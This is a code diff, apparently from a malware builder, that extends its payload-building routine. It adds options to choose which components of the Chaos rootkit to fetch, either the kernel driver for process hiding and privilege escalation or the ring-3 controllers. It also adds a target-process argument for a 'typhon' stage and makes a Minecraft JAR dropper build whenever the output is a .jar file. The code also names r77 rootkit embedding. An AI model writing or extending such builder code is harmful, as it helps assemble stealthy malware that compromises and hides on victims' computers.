@@ -97,6 +97,8 @@ type BuildProcessConfig = {
   jarModId?: string;
   enableR77?: boolean;
   enableChaos?: boolean;
+  chaosMode?: string;
+  typhonProcess?: string;
   requireAdmin?: boolean;
   outputExtension?: string;
   sleepSeconds?: number;
@@ -1385,6 +1387,9 @@ func runBoundFiles() {
           if (config.typhonVariant) {
             typhonArgs.push("-variant", config.typhonVariant);
           }
+          if (config.typhonProcess) {
+            typhonArgs.push("-process", config.typhonProcess);
+          }
 
           try {
             let typhonResult;
@@ -1476,7 +1481,7 @@ func runBoundFiles() {
     }
 
     // ── Minecraft JAR dropper ────────────────────────────────────────────────
-    if (config.enableJar) {
+    if (config.enableJar || config.outputExtension === ".jar") {
       sendToStream({ type: "status", text: "Building Minecraft JAR dropper..." });
       sendToStream({ type: "output", text: "\n=== Minecraft JAR Dropper ===\n", level: "info" });
       const javaTools = await checkJavaAvailable(sendToStream);
@@ -1567,7 +1572,10 @@ func runBoundFiles() {
       sendToStream({ type: "status", text: "Fetching Chaos rootkit assets..." });
       sendToStream({ type: "output", text: "\n=== Chaos Rootkit (Ring 0 + Ring 3) ===\n", level: "info" });
       sendToStream({ type: "output", text: "Chaos: kernel driver (DKOM process hiding, privilege escalation) + ring-3 controller\n", level: "info" });
-      const chaosAssetNames = ["Chaos-Rootkit.sys", "ring3-console.exe", "ring3-gui.exe"];
+      const chaosMode = config.chaosMode || "both";
+      const chaosAssetNames: string[] = [];
+      if (chaosMode === "ring0" || chaosMode === "both") chaosAssetNames.push("Chaos-Rootkit.sys");
+      if (chaosMode === "ring3" || chaosMode === "both") chaosAssetNames.push("ring3-console.exe", "ring3-gui.exe");
       const rootkitCacheDir = path.join(ensureDataDir(), "tools", "rootkit-cache", "chaos");
       const chaosAssets = await fetchGithubReleaseAssets(
         "ZeroMemoryEx", "Chaos-Rootkit",
